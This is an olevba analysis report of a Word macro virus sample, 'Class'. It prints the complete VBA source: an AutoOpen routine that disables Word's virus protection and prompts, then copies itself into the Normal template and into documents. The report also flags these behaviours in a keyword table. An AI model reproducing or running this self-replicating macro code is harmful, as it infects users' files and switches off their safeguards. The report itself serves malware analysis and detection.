olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.fm-2809be51006fa88e3ce722a51af95b1e2f31b709
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.fm-2809be51006fa88e3ce722a51af95b1e2f31b709 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
On Error GoTo out
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
Options.VirusProtection = False
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
Options.SaveNormalPrompt = False
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
Options.ConfirmConversions = False
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
ad = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
nt = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
If nt > 70 And ad > 0 Then GoTo out
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
If nt < 70 Then
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    Set host = NormalTemplate.VBProject.VBComponents.Item(1)
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Name = host.Name
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\class.sys"
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
End If
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
If ad = 0 Then Set host = ActiveDocument.VBProject.VBComponents.Item(1)
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
If Day(Now) = 14 And (Month(Now) > 5) Then MsgBox "I Think " & Application.UserName & " is a big stupid jerk!", 0, "VicodinES Loves You / Class.Poppy"
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
host.codemodule.AddFromFile ("c:\class.sys")
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
With host.codemodule
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    For x = 1 To 4
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    .deletelines 1
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    Next x
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
End With
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
If nt < 70 Then
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    With host.codemodule
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    .replaceline 1, "Sub AutoClose()"
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    .replaceline 71, "Sub ToolsMacro()"
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    End With
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
End If
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
With host.codemodule
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    For x = 2 To 72 Step 2
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    .replaceline x, "'" & Application.UserName & Now & Application.ActivePrinter & Application.ActiveWindow
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
    Next x
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
End With
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
out:
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
If nt > 70 And ad = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
End Sub
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
Sub ViewVBCode()
'Dustin A. Lovell1/24/00 9:30:53 AMHP LaserJet 5Si/5Si MX on \\EDU-USU-ADMISSIONS\FINAID_5SIOrson Scott Card - Speaker for the Dead.doc
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

